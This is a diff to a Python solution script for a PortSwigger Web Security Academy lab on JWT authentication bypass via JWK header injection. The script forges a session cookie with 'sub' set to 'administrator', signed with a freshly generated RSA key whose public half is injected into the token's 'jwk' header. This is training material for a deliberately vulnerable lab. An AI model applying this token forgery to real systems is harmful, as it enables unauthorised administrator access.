@@ -3,7 +3,6 @@
 # Lab-Link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection
 # Difficulty: PRACTITIONER
 from bs4 import BeautifulSoup
-import json
 from jwcrypto import jwk
 import jwt
 import requests
@@ -37,14 +36,14 @@ def manipulate_cookie(client, host):
     payload['sub'] = 'administrator'
 
     key = jwk.JWK.generate(kty='RSA', size=2048)
-    public_key = key.export_public()    
+    public_key = key.export_public(as_dict=True)
     private_key = key.export_to_pem(private_key=True, password=None)
     print(f"[+] Generated RSA key pair")
 
     cookie = jwt.encode(payload,
                         private_key,
                         algorithm="RS256",
-                        headers={"jwk": json.loads(public_key)})
+                        headers={"jwk": public_key})
     print(f"[+] Encoded JWT and injected JWK")
 
     client.cookies.set('session', cookie, domain=f'{host[8:]}')
